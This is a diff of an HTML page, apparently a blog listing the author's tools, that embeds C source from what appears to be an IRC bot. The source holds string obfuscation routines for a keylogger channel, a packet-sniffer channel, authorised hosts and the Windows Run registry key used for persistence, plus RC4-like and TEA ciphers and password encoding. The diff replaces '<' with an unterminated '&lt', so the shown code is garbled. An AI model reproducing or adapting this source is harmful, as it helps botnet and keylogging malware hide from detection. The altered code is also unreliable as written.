@@ -2131,7 +2131,6 @@ void display_skeksi(void)
 
 
       <div class="blogContainer">
-        <a name="encrypter"></a>
         <div class="greeting">
           <div class="greetingHeader">Tools of various types of orientation, used in my activities</div>
           <div class="mainTextAfter"></div>
@@ -2350,20 +2349,20 @@ void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key, DWORD keylen)
 	ZeroMemory(Sbox2, sizeof(Sbox2));
 
     //initialize sbox i
-	for(i = 0; i < 256U; i++)
+	for(i = 0; i &lt 256U; i++)
 		Sbox[i] = (TCHAR)i;
 
     //whether user has sent any input key
 	if(keylen) {
 		//initialize the sbox2 with user key
-		for(i = 0; i < 256U ; i++) {
+		for(i = 0; i &lt 256U ; i++) {
 			if(j == keylen)
 				j = 0;
 			Sbox2[i] = key[j++];
 		}    
 	} else {
 		//initialize the sbox2 with our key
-		for(i = 0; i < 256U ; i++) {
+		for(i = 0; i &lt 256U ; i++) {
 			if(j == (unsigned long)OurKeyLen)
 				j = 0;
 			Sbox2[i] = OurUnSecuredKey[j++];
@@ -2372,7 +2371,7 @@ void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key, DWORD keylen)
 
 	j = 0 ; //Initialize j
 	//scramble sbox1 with sbox2
-	for(i = 0; i < 256; i++) {
+	for(i = 0; i &lt 256; i++) {
 		j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
 		temp =  Sbox[i];                    
 		Sbox[i] = Sbox[j];
@@ -2380,7 +2379,7 @@ void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key, DWORD keylen)
 	}
 
 	i = j = 0;
-	for(x = 0; x < inplen; x++) {
+	for(x = 0; x &lt inplen; x++) {
 		//increment i
 		i = (i + 1U) % 256U;
 		//increment j
@@ -2429,10 +2428,10 @@ void decryptstrings(int authsize, int versionsize)
 	Crypt(keylogchan,strlen(keylogchan),"",0);
 	Crypt(psniffchan,strlen(psniffchan),"",0);
 
-	for(i=0;i < authsize;i++)
+	for(i=0;i &lt authsize;i++)
 		Crypt(authost[i],strlen(authost[i]),"",0);
 
-	for(i=0;i < versionsize;i++)
+	for(i=0;i &lt versionsize;i++)
 		Crypt(versionlist[i],strlen(versionlist[i]),"",0);
 
 	Crypt(regkey1,strlen(regkey1),"",0); // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -2455,7 +2454,7 @@ void encryptstring(char *str, char *varname, SOCKET sock, char *chan, BOOL notic
 	Crypt(str, strlen(str),"",0);
 
 	sprintf(buffer,"char %s[]={",varname);
-	for (unsigned int i=0; i < strlen(str); i++)
+	for (unsigned int i=0; i &lt strlen(str); i++)
 	{
 		char tmpbuf[12];
 		_snprintf(tmpbuf,sizeof(tmpbuf),"%d,", str[i]);
@@ -2503,7 +2502,7 @@ void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, BOOL
 
 	memset(buffer,0,sizeof(buffer));
 	sprintf(buffer,"char *authost[]={");
-	for(i=0;i < authsize;i++) {
+	for(i=0;i &lt authsize;i++) {
 		sprintf(sendbuf,"authost%d",i+1);
 		encryptstring(authost[i],sendbuf,sock,chan,notice);
 		strcat(buffer,sendbuf);strcat(buffer,",");
@@ -2514,7 +2513,7 @@ void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, BOOL
 
 	memset(buffer,0,sizeof(buffer));
 	sprintf(buffer,"char *versionlist[]={");
-	for(i=0;i < versionsize;i++) {
+	for(i=0;i &lt versionsize;i++) {
 		sprintf(sendbuf,"versionlist%d",i+1);
 		encryptstring(versionlist[i],sendbuf,sock,chan,notice);
 		strcat(buffer,sendbuf);strcat(buffer,",");
@@ -2560,9 +2559,9 @@ void encipher(const unsigned long *const v,unsigned long *const w,const unsigned
 		sum=0,delta=0x9E3779B9,n=32;
 
 	while(n-->0) {
-		y += (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
+		y += (z &lt&lt 4 ^ z >> 5) + z ^ sum + k[sum&3];
 		sum += delta;
-		z += (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
+		z += (y &lt&lt 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
 	}
 
 	w[0]=y; w[1]=z;
@@ -2575,11 +2574,11 @@ void decipher(const unsigned long *const v,unsigned long *const w,const unsigned
 	register unsigned long y=v[0],z=v[1],
 		sum=0xC6EF3720,delta=0x9E3779B9,n=32;
 
-	/* sum = delta<<5, in general sum = delta * n */
+	/* sum = delta&lt&lt5, in general sum = delta * n */
 	while(n-->0) {
-		z -= (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
+		z -= (y &lt&lt 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
 		sum -= delta;
-		y -= (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
+		y -= (z &lt&lt 4 ^ z >> 5) + z ^ sum + k[sum&3];
 	}
    
 	w[0]=y; w[1]=z;
@@ -2595,8 +2594,8 @@ void code(long *data, long *key)
 
 	while (n-- > 0) {
 		sum += delta;
-		y += (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
-		z += (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
+		y += (z &lt&lt 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
+		z += (y &lt&lt 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
 	}
 	data[0] = y;
 	data[1] = z;
@@ -2608,10 +2607,10 @@ void decode(long *data, long *key)
 {
 	unsigned long n = 32, sum, y = data[0], z = data[1], delta=0x9e3779b9;
 
-	sum = delta << 5;
+	sum = delta &lt&lt 5;
 	while (n-- > 0) {
-		z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
-		y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
+		z -= (y &lt&lt 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
+		y -= (z &lt&lt 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
 		sum -= delta;  
 	}
 	data[0] = y; 
@@ -2629,7 +2628,7 @@ void codestr(char *datastr, char *keystr)
 
 	datasize = strlen(datastr) / sizeof(long);
 	datasize = 0 ? 1 : datasize;
-	while (i < datasize) {
+	while (i &lt datasize) {
 		code(data, key);
 		i += 2;
 		data = (long *)datastr + i;
@@ -2646,7 +2645,7 @@ void decodestr(char *datastr, char *keystr)
 
 	datasize = strlen(datastr) / sizeof(long);
 	datasize = 0 ? 1 : datasize;
-	while (i < datasize) {
+	while (i &lt datasize) {
 		decode(data, key);
 		i += 2;
 		data = (long *)datastr + i;
@@ -2683,7 +2682,7 @@ char *EncryptPassword(char *password, char *key)
 	keybuf = (unsigned char *) malloc(strlen(key)+1);
 	strcpy((char *)keybuf, key);
   
-	for (i=1; i < keylen; i++)
+	for (i=1; i &lt keylen; i++)
 		keybuf[i] += keybuf[i-1];
   
 	for (i=keylen-1; i >= 1; i--)
@@ -2695,7 +2694,7 @@ char *EncryptPassword(char *password, char *key)
   
 	/* Calculate one byte checksum of password's nibbles */
 	checksum = 0;
-	for (i=0 ; i<passlen; i++) {
+	for (i=0 ; i &lt passlen; i++) {
 		checksum += (password[i] >> 4) & 0x0F;  /* left nibble */
 		checksum += password[i] & 0x0F;         /* right nibble */
 	}
@@ -2716,7 +2715,7 @@ char *EncryptPassword(char *password, char *key)
 	** appropriate byte from the string key to the character, then add
 	** the previous character to this character.
 	*/
-	for (i=1; i < passlen; i++) {
+	for (i=1; i &lt passlen; i++) {
 		binary[i] += keybuf[i % keylen];
 		binary[i] += binary[i-1];
 	}
@@ -2737,18 +2736,18 @@ char *EncryptPassword(char *password, char *key)
 	ascii[j++] = '!';
 	ascii[j] = 0;
 	unused = 6;
-	for (i=0; i<passlen; i++) {
+	for (i=0; i &lt passlen; i++) {
 		c = binary[i];
 		remainder = 8;
 		while (remainder > 0) {
-			unsigned int bits = (remainder < unused) ? remainder : unused;
+			unsigned int bits = (remainder &lt unused) ? remainder : unused;
 
 			/* Fill unused space left to right with with leftmost bits */
-			ascii[j] <<= bits;
+			ascii[j] &lt&lt= bits;
 			ascii[j] |= (c>>(8-bits)) & Mask[bits];
 			unused -= bits;
 			remainder -= bits;
-			c <<= bits;     /* Keep remainder in left end */
+			c &lt&lt= bits;     /* Keep remainder in left end */
 			if (unused == 0) {
 				ascii[j] = SixbitToChar[ascii[j]];
 				ascii[++j] = 0;
@@ -2757,8 +2756,8 @@ char *EncryptPassword(char *password, char *key)
 		}
     }
   
-	if (unused < 6) {
-		ascii[j] <<= unused;
+	if (unused &lt 6) {
+		ascii[j] &lt&lt= unused;
 		ascii[j] = SixbitToChar[ascii[j]];
 		j++;
 	}
@@ -2797,7 +2796,7 @@ char *DecryptPassword(char *ascii, char *key)
 	keybuf = (unsigned char *)malloc(strlen(key)+1);
 	strcpy((char *)keybuf, key);
   
-	for (i=1; i < keylen; i++)
+	for (i=1; i &lt keylen; i++)
 		keybuf[i] += keybuf[i-1];
   
 	for (i=keylen-1; i >= 1; i--)
@@ -2809,9 +2808,9 @@ char *DecryptPassword(char *ascii, char *key)
 	/* Convert from 6-bit ASCII to 8-bit binary */
 	binary[j] = 0;
 	needed = 8;
-	for (i=1; i < asciilen; i++) {
+	for (i=1; i &lt asciilen; i++) {
 		c = 0xFF;
-		for (k=0 ; k<64 ; k++) {
+		for (k=0 ; k &lt 64 ; k++) {
 			if (ascii[i] == SixbitToChar[k]) {
 				c = k;
 				break;
@@ -2825,12 +2824,12 @@ char *DecryptPassword(char *ascii, char *key)
       
 		avail = 6;
 		while (avail > 0) {
-			unsigned int bits = (avail < needed) ? avail : needed;
+			unsigned int bits = (avail &lt needed) ? avail : needed;
 	  
 			/* Fill empty space with leftmost bits */
-			binary[j] <<= bits;
+			binary[j] &lt&lt= bits;
 			binary[j] |= (c>>(6-bits)) & Mask[bits];
-			c <<= bits;
+			c &lt&lt= bits;
 			avail -= bits;
 			needed -= bits;
 	  
@@ -2847,7 +2846,7 @@ char *DecryptPassword(char *ascii, char *key)
 	** For each character from the first to n-1, subtract the
 	** character to the right.
 	*/
-	for (i=0; i < clearlen-1; i++)
+	for (i=0; i &lt clearlen-1; i++)
 		binary[i] -= binary[i+1];
   
 	for (i=clearlen-1; i>=1; i--) {
@@ -2866,7 +2865,7 @@ char *DecryptPassword(char *ascii, char *key)
   
 	/* Calculate one byte checksum of password's nibbles */
 	checksum = 0;
-	for (i=0 ; i<binary[1]; i++) {
+	for (i=0 ; i &lt binary[1]; i++) {
       checksum += (binary[i+3] >> 4) & 0x0F;  /* left nibble */
       checksum += binary[i+3] & 0x0F;         /* right nibble */
     }
@@ -2878,7 +2877,7 @@ char *DecryptPassword(char *ascii, char *key)
   
 	/* Move password down to the beginning of the array */
 	passlen = binary[1];
-	for (i=0 ; i<passlen; i++)
+	for (i=0 ; i &lt passlen; i++)
 		binary[i] = binary[i+3];
 	binary[passlen] = '\0'; /* Add terminator */
   
@@ -2892,16 +2891,6 @@ char *DecryptPassword(char *ascii, char *key)
 		  	</details>
         </div>
       </div>
-
-
-
-
-
-
-
-      
-
-
 
     </div>
 
